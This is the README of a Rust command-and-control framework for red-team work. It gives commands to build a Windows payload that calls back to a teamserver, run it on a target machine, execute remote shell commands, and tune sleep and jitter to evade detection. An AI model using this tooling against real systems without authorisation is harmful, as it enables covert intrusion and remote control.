# Rust C2 Framework

A Command and Control (C2) framework written in Rust, designed for security research and penetration testing. This framework provides a teamserver and client architecture similar to Cobalt Strike, Sliver, and Mythic.

## Features

- **Multi-agent support**: Handle multiple agents simultaneously
- **Real-time communication**: WebSocket-based communication with agents
- **Command execution**: Execute shell commands on remote agents
- **System information**: Get detailed system information from agents
- **Process management**: List and kill processes on agents
- **Sleep control**: Configure agent sleep intervals with jitter
- **Payload generation**: Generate Windows executable payloads
- **Session management**: Track agent sessions and status
- **Encryption**: All communication encrypted with AES-GCM
- **Authentication**: Shared encryption key for teamserver-agent authentication
- **Session Management**: Unique session IDs for each agent
- **Error Handling**: Graceful handling of connection failures
- **Sleep/Jitter**: Configurable agent sleep intervals to avoid detection
- **Live Connection Validation**: Ensures commands only go to truly connected agents

## Installation

### Prerequisites
- Rust 1.70+ (install via [rustup](https://rustup.rs/))
- Visual Studio Build Tools 2017+ with C++ workload
- Windows target for payload generation: `rustup target add x86_64-pc-windows-msvc`

### Quick Start (Windows)

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd rust-c2
   ```

2. **Run the automatic installer and build:**
   ```bash
   install\install.bat
   ```
   This will install all dependencies, set up the environment, and build the project automatically.

### Manual Installation

If you prefer to install dependencies manually:

1. **Install Rust:**
   - Download from https://rustup.rs/
   - Run `rustup-init.exe`
   - Restart your terminal

2. **Install Visual Studio Build Tools:**
   - Download from https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
   - Select "C++ build tools" workload during installation
   - Or use: `winget install Microsoft.VisualStudio.2022.BuildTools`

3. **Add Windows target:**
   ```bash
   rustup target add x86_64-pc-windows-msvc
   ```

4. **Build the project:**
   ```bash
   cargo build --release
   ```

### Build Scripts

The project includes several build and setup scripts:

- `install\install.bat` - Full automatic installation **and build**
- `install\install_dependencies.bat` - Installs dependencies only
- `Scripts\setup_vs_env.bat` - Sets up Visual Studio environment variables
- `Scripts\cleanup.bat` - Kills C2 processes and clears all sessions

### Verify the Build

After building, verify that all binaries were created:
```bash
# Check that all binaries were created
ls target/release/teamserver.exe
ls target/release/client.exe
ls target/release/agent.exe
```

## Usage

### Starting the Teamserver

1. **Start the teamserver:**
   ```bash
   ./target/release/teamserver.exe
   ```
   
   The teamserver will start listening on `127.0.0.1:8080` by default.

2. **Custom configuration:**
   ```bash
   ./target/release/teamserver.exe --bind 0.0.0.0 --port 8443 --key my-secret-key
   ```
3. **Basic teamserver addition**
.\target\release\teamserver.exe --key testkey123

### Starting the Client

1. **Start the client in interactive mode:**
   ```bash
   ./target/release/client.exe
   ```
   
   The client will connect to the teamserver and provide an interactive command interface.

2. **Custom teamserver connection:**
   ```bash
   ./target/release/client.exe --server ws://192.168.1.100:8080 --key my-secret-key
   ```
3. **Basic client addition**
.\target\release\client.exe --key testkey123

### Generating Payloads

Generate a Windows executable that will connect back to your teamserver:

```bash
./target/release/client.exe generate-payload \
  --output payload.exe \
  --callback 192.168.1.100 \
  --port 8080 \
  --key default-key-change-in-production
```

This creates:
- `payload.exe`: The agent executable
- `payload.bat`: A batch file that runs the agent with correct parameters

### Deploying Agents

1. **Transfer files to target:**
   - Copy both `payload.exe` and `payload.bat` to your target Windows machine

2. **Run the payload:**
   ```bash
   payload.bat
   ```
   
   The agent will automatically connect back to your teamserver.

### Managing Agents

#### List Connected Agents
```bash
./target/release/client.exe list
```

Or in interactive mode:
```
overlook> list
```

**Note**: The `list` command now only shows agents that are truly connected and ready to receive commands. Agents that appear in the session file but don't have active connections are automatically filtered out.

Output example:
```
[*] Listing connected agents...
[*] Total online agents: 1
====================================================================================================
Agent ID                             Hostname             IP Address      Status     Sleep(ms)    Jitter   Note      
====================================================================================================
9cf1ca6e-d340-48a8-8879-e471a92574ec DESKTOP-VCLG590      127.0.0.1       Online     -            -      
====================================================================================================
```

#### Execute Commands
```bash
./target/release/client.exe execute --agent-id 9cf1ca6e-d340-48a8-8879-e471a92574ec --command "whoami"
```

Or in interactive mode:
```
overlook> execute 9cf1ca6e-d340-48a8-8879-e471a92574ec whoami
```

#### Get System Information
```bash
./target/release/client.exe sysinfo --agent-id 9cf1ca6e-d340-48a8-8879-e471a92574ec
```

Or in interactive mode:
```
overlook> sysinfo 9cf1ca6e-d340-48a8-8879-e471a92574ec
```

#### Kill Agent
```bash
./target/release/client.exe kill --agent-id 9cf1ca6e-d340-48a8-8879-e471a92574ec
```

Or in interactive mode:
```
overlook> kill 9cf1ca6e-d340-48a8-8879-e471a92574ec
```

#### Set Agent Sleep Duration
```bash
./target/release/client.exe sleep --agent-id 9cf1ca6e-d340-48a8-8879-e471a92574ec --seconds 30 --jitter 10
```

Or in interactive mode:
```
overlook> sleep 9cf1ca6e-d340-48a8-8879-e471a92574ec 30 10
```

### Interactive Mode Commands

When running the client in interactive mode, you have access to these commands:

- `list` - List all connected agents (only shows truly connected agents)
- `execute <id> <cmd>` - Execute command on agent
- `sysinfo <id>` - Get system info from agent
- `sleep <id> <seconds> <jitter>` - Set agent sleep duration with jitter (%)
- `generatepayload <output> <callback> <port> <key>` - Generate Windows payload
- `quit` or `exit` - Exit

### Cleaning Up Sessions and Processes

To kill all C2 processes and clear all sessions (reset `sessions.json` to empty):

```cmd
Scripts\cleanup.bat
```

This will:
- Kill all C2 processes (`teamserver.exe`, `agent.exe`, `client.exe`)
- Clear all sessions from `sessions.json` (sets it to `[]`)
- Clean up temporary build files

## Architecture

### Components

1. **Teamserver (`teamserver`)**
   - WebSocket server for agent communication
   - Session management and tracking
   - Command distribution and response handling
   - Message forwarding between client and agents
   - Live connection validation

2. **Client (`client`)**
   - Controller interface that connects to teamserver
   - Interactive command-line interface
   - Payload generation
   - Agent management and monitoring
   - Smart agent listing (only shows connected agents)

3. **Agent (`agent`)**
   - Lightweight client executable
   - Automatic reconnection on failure
   - Command execution and response
   - System information gathering

4. **Protocol Layer**
   - Encrypted WebSocket communication
   - Message serialization/deserialization
   - Heartbeat management

### Communication Flow

```
┌─────────────┐    WebSocket    ┌─────────────┐    WebSocket    ┌─────────────┐
│   Client    │ ──────────────► │ Teamserver  │ ──────────────► │   Agents    │
│ (Controller)│                 │   (Server)  │                 │ (Payloads)  │
└─────────────┘                 └─────────────┘                 └─────────────┘
```

1. **Client → Teamserver**: Client connects to teamserver for agent management
2. **Agent → Teamserver**: Agent connects and registers with teamserver
3. **Client → Agent**: Commands flow: Client → Teamserver → Agent
4. **Agent → Client**: Responses flow: Agent → Teamserver → Client
5. **Heartbeat**: Agent sends periodic heartbeats to teamserver
6. **Reconnection**: Agent automatically reconnects if connection is lost

### Security Features

- **Encryption**: All communication encrypted with AES-GCM
- **Authentication**: Shared encryption key for teamserver-agent authentication
- **Session Management**: Unique session IDs for each agent
- **Error Handling**: Graceful handling of connection failures
- **Sleep/Jitter**: Configurable agent sleep intervals to avoid detection
- **Live Connection Validation**: Ensures commands only go to truly connected agents

## Configuration

### Teamserver Configuration

Default teamserver configuration:
```toml
bind_address = "127.0.0.1"
port = 8080
encryption_key = "default-key-change-in-production"
```

### Client Configuration

Default client configuration:
```toml
teamserver_url = "ws://127.0.0.1:8080"
encryption_key = "default-key-change-in-production"
timeout = 30
retry_interval = 5
max_retries = 3
```

## Advanced Features

### Sleep and Jitter Control

Configure agent sleep intervals to avoid detection:

- **Sleep Duration**: Time between agent check-ins (in seconds)
- **Jitter**: Random variation in sleep duration (as percentage)

Example:
```
overlook> sleep 9cf1ca6e-d340-48a8-8879-e471a92574ec 30 10
```
This sets the agent to sleep for 30 seconds ± 10% (27-33 seconds).

### Troubleshooting

If you encounter build errors, try these solutions in order:

1. **Check your environment:**
   - Make sure you have run `install\install.bat` from a fresh terminal
   - If you see errors about `cl.exe` or `link.exe` not found, ensure you have the Visual Studio Build Tools with the C++ workload installed
   - If you still have issues, open a "x64 Native Tools Command Prompt for VS 2022" and run the build again

2. **Common linker errors:**
   - **Error: `link.exe` not found**: Run `Scripts\setup_vs_env.bat` to set up Visual Studio environment
   - **Error: `cl.exe` not found**: Install Visual Studio Build Tools with C++ workload
   - **Error: Windows target not found**: Run `rustup target add x86_64-pc-windows-msvc`

3. **Manual Visual Studio Build Tools installation:**
   - Download from: https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
   - Select "C++ build tools" workload during installation
   - Restart your terminal after installation

### Runtime Issues

1. **Agent not connecting**:
   - Verify teamserver is running and accessible
   - Check firewall settings
   - Ensure encryption keys match

2. **Commands not executing**:
   - Verify agent is online (use `list` command)
   - Check agent permissions
   - Review command syntax
   - Use `cleanup` command to remove stale sessions

3. **Agent shows in session file but not in list**:
   - The agent may be marked as "Online" but not actually connected
   - Use `cleanup` command to mark stale sessions as offline
   - Restart the agent if needed

### Logs and Debugging

- Teamserver logs connection events and errors
- Client provides detailed command execution feedback
- Use `cleanup` command to remove stale sessions and update session file
- The `list` command now only shows agents with live connections

## Security Considerations

⚠️ **Important**: This framework is designed for authorized security research and penetration testing only.

- Change default encryption keys in production
- Use proper network segmentation
- Monitor for unauthorized access
- Follow responsible disclosure practices
- Comply with applicable laws and regulations

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## License

This project is licensed under the MIT License - see the LICENSE file for details. 